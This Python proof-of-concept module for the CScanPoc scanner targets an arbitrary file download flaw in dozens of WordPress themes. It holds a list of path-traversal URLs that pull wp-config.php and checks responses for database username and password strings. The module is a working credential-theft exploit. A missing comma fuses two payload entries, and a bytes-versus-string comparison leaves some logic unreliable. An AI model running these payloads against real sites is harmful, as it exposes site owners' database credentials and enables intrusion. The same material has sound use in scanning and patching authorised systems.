# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'WordPress_0022'  # 平台漏洞编号，留空
    name = 'WordPress Multiple themes /download.php Arbitrary File Download'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-12-24'  # 漏洞公布时间
    desc = '''
        WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
        download_file" variable is not sanitized.
        This exploit allows the attacker to exploit the flaw Arbitrary File
        Download in dozens of wordpress themes.
        Through regular expressions, the script will perform the check for each
        target url checking your wp-config.php file.
    '''  # 漏洞描述
    ref = 'https://packetstormsecurity.com/files/129706/wptheme-download.txt'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Multiple themes'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0999c6cf-6498-453e-9ecc-dfb8340a424c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = [
                '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
                '/wp-content/force-download.php?file=../wp-config.php',
                '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php',
                '/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php',
                '/wp-content/themes/markant/download.php?file=../../wp-config.php',
                '/wp-content/themes/yakimabait/download.php?file=./wp-config.php',
                '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php',
                '/wp-content/themes/felis/download.php?file=../wp-config.php',
                '/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php',
                '/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php'
                '/wp-content/themes/epic/includes/download.php?file=wp-config.php',
                '/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php',
                '/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php',
                '/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php',
                '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
                '/wp-content/themes/lote27/download.php?download=../../../wp-config.php',
                '/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php',
                '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php'
            ]

            for filename in payload:
                verify_url = self.target + filename
                try:
                    req = urllib.request.Request(verify_url)
                    content = urllib.request.urlopen(req).read()
                except:
                    continue
                if 'DB_PASSWORD' in content and 'DB_USER' in content:
                    #args['success'] = True
                    # args['poc_ret']['file_path'].append(verify_url)
                    self.target = verify_url
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
